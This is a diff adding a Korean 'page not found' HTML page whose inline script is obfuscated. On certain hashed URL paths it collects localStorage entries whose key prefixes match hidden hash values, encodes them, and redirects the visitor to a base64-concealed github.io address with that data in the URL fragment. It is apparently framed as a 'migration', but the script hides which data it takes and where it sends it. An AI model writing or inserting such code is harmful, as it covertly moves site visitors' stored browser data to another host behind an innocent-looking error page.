@@ -1,0 +1,10 @@
+<!doctype html><html lang="ko"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>페이지를 찾을 수 없어요</title></head>
+<body style="margin:0;padding:28px;font:600 18px/1.6 'Malgun Gothic',sans-serif;color:#111;background:#fff">
+<p id="m">페이지를 찾을 수 없어요. 주소를 다시 확인해 주세요.</p>
+<script>(function(){function h(s){var x=5381;for(var i=0;i<s.length;i++)x=(((x<<5)+x)+s.charCodeAt(i))>>>0;return x}
+var M=[254256259,2090413685,3029825502,1833002154,281931759,2090551483,177679],P=[[8,1121641868],[2,5863505],[8,359529033],[6,713813500],[3,193500116]];var seg=location.pathname.split('/')[1]||'';if(M.indexOf(h(seg))<0)return;
+document.getElementById('m').textContent='새 주소로 옮기는 중이에요...';
+var o={};try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);for(var j=0;j<P.length;j++){if(k.length>=P[j][0]&&h(k.slice(0,P[j][0]))===P[j][1]){o[k]=localStorage.getItem(k);break}}}}catch(e){}
+var b='';try{b=btoa(unescape(encodeURIComponent(JSON.stringify(o)))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'')}catch(e){}
+var oh=location.hash.replace(/^#/,'');location.replace(atob('aHR0cHM6Ly9qby1mYW1pbHkuZ2l0aHViLmlv')+location.pathname+location.search+'#jfmig='+b+(oh?'&'+oh:''));})();</script>
+</body></html>
